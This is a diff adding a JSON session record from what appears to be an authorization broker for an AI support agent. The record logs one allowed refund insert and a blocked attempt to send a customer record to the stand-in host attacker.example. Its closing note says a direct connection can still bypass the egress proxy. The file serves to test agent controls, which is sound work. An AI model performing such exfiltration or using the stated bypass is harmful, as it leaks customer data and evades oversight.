@@ -1,0 +1,72 @@
+{
+  "session_id": "refund-triage-combined",
+  "generated_at": "2026-06-22T16:33:54+00:00",
+  "tier": "0 (advisory)",
+  "tier_structural": false,
+  "mandate": {
+    "principal": "support-bot",
+    "task_id": "refund-triage-001",
+    "database": "app",
+    "granted_scope": [
+      {
+        "rail": "supabase",
+        "action": "select",
+        "target": "public.credits"
+      },
+      {
+        "rail": "supabase",
+        "action": "insert",
+        "target": "public.credits"
+      },
+      {
+        "rail": "egress",
+        "action": "connect",
+        "target": "payments.internal:443"
+      }
+    ]
+  },
+  "effects": [
+    {
+      "seq": 1,
+      "rail": "supabase",
+      "label": "legitimate refund",
+      "proposed": {
+        "action": "insert",
+        "target": "public.credits",
+        "detail": "order_id=ORD-1042, amount=50.0, currency=EUR"
+      },
+      "decision": "ALLOW",
+      "reason": "minted ES256 JWT role=signet_public_rw ttl=60s for public.credits.insert",
+      "escalation_source": "resolved",
+      "token_minted": true,
+      "performed": {
+        "rows": 1,
+        "executed": true
+      },
+      "receipt_id": "2c4a4f1d32da2ff3b0ad67ad2513bca48b5e4a6a77bb094051e1cb1ff69a25ea",
+      "receipt_verified": true,
+      "note": null
+    },
+    {
+      "seq": 2,
+      "rail": "egress",
+      "label": "data exfiltration (CONNECT to an external host)",
+      "proposed": {
+        "action": "connect",
+        "target": "attacker.example:443",
+        "detail": "url=https://attacker.example/leak?data=customer_record"
+      },
+      "decision": "BLOCK",
+      "reason": "proxy refused CONNECT to attacker.example:443 (HTTP 403)",
+      "escalation_source": "admission_denied",
+      "token_minted": false,
+      "performed": {
+        "egress": "blocked",
+        "executed": false
+      },
+      "receipt_id": "5fec58415a751289b4147cc74db1091c5bfeac586e99237bda29d9af3f1fae74",
+      "receipt_verified": true,
+      "note": "advisory (inline proxy): the proxy genuinely refuses off-allowlist hosts, but a direct connection can bypass it until a netns forces the proxy as the sole route (structural, Thread C / CAP_NET_ADMIN \u2014 out of scope). tests/test_broker_egress.py #8 records this."
+    }
+  ]
+}
